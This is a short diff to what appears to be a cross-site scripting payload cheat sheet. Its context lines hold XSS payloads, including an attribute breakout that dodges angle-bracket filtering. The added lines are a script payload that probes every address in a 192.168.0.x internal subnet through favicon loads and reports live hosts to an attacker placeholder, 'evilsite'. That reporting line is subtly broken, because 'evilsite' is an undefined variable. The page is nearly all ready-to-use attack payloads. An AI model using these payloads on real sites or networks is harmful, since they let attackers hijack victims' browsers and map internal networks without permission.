@@ -30,3 +30,14 @@ ${alert(document.domain)}
 
 *Payload to bypass angle bracket restriction:
 "onfocus=alert(1337) autofocus="
+
+
+*Payload to conduct internal portscan
+<script>
+ for (let i = 0; i < 256; i++) {
+  let ip = '192.168.0.' + i
+
+  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=evilsite' + ip + '">'
+  document.body.innerHTML += code
+ }
+</script>
